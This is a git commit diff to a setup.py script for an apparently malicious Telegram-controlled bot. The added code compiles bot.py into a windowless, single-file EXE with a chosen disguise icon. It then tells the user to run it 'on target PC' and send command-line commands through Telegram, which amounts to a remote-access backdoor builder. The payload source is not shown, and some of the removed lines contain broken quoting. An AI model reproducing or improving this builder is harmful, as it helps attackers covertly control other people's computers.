3a95e4647b3d3209c6e5440b5cdff935e8758aaa
Sovenok-Hacker <79601745+Sovenok-Hacker@users.noreply.github.com>
2022-01-14 19:08:12 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,7 +1,9 @@
-config = open('config.py', 'w')
-config.write(f'token = {input('Telegram bot token: ')}')
+import os
 icon = input('Use default file icon or your own icon (D for default, path to file for use your local icon):')
 if icon == 'D':
-    config.write('icon = "bot.py"')
+    icon = "bot.py"
 else:
-  config.write(f'icon = {icon}')
+  icon = icon
+print('Building EXE file...')
+os.system(f'pyinstaller --icon {icon} -w --onefile bot.py')
+print('Run bot.exe on target PC and send CMD commands to your telegram bot')
